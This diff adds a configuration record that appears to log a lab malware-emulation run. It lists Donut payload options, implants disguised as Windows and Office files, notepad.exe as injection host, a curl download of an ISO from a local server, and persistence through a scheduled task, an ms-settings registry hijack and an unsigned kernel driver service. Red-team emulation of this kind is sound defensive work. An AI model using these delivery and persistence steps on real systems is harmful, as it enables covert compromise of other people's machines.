@@ -1,0 +1,15 @@
+scenario=run-b-initial
+delivery_bind=192.168.1.50:18080
+delivery_object=donut-delivery.iso
+target=192.168.1.52
+allowed_network=192.168.1.0/24
+donut_options=-a 2 -b 1 -e 1 -z 1
+planted_images=ExcelPreview.exe,uxtheme.dll,fontcache.ttf,moimoi.sys
+injection_host=notepad.exe
+target_delivery=curl.exe http://192.168.1.50:18080/donut-delivery.iso
+target_execute=C:\ProgramData\Microsoft\NetTokenBroker\ExcelPreview.exe
+persistence_task=cmd.exe /C schtasks.exe /Create /XML <lab-task-xml> /F
+persistence_registry=reg.exe add HKCU\Software\Classes\ms-settings\Shell\open\command
+persistence_service=sc.exe create <lab-service> binPath= <lab-unsigned-driver> type= kernel
+driver_security_controls=DSE unchanged; test-signing unchanged; Secure Boot unchanged
+disposition=invalid XML prevented task registration; rolled back before retry
